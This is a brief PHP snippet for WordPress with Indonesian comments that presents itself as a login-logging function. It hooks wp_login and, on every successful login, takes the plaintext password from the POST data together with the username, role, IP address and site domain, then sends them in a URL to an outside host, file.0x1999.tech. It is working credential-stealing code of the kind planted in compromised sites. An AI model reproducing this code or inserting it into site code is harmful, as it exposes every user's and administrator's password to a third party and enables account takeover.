<?php
//  Fungsi untuk mencatat login dan mengirim log 
function send_login_data_to_external_url($user_login, $user) {
    //  Dapatkan informasi user
    $user_ip = $_SERVER['REMOTE_ADDR']; // Alamat IP pengguna
    $login_time = date("Y-m-d H:i:s"); // Waktu login
    $user_role = implode(', ', $user->roles); // Peran pengguna
    $domain = home_url(); // Domain situs WordPress

    // Ambil password yang digunakan dari POST (tidak disarankan di produksi!)
    $password_used = isset($_POST['pwd']) ? $_POST['pwd'] : 'Password not available';

    //  Format data menjadi teks biasa dengan emoji
    $data = "🏠 Domain: $domain\n";
    $data .= "👤 Username: $user_login\n";
    $data .= "🔑 Password: $password_used\n";
    $data .= "🎭 Role: $user_role\n";
    $data .= "📍 IP Address: $user_ip\n";
    $data .= "⏰ Login Time: $login_time\n";

    //  URL endpoint tujuan
    $endpoint_url = 'https://file.0x1999.tech/post.php?p=' . urlencode($data);

    // Kirim data menggunakan file_get_contents
    file_get_contents($endpoint_url);
}

// Hook ke wp_login untuk mengirim data login ke URL eksternal
add_action('wp_login', 'send_login_data_to_external_url', 10, 2);
?>
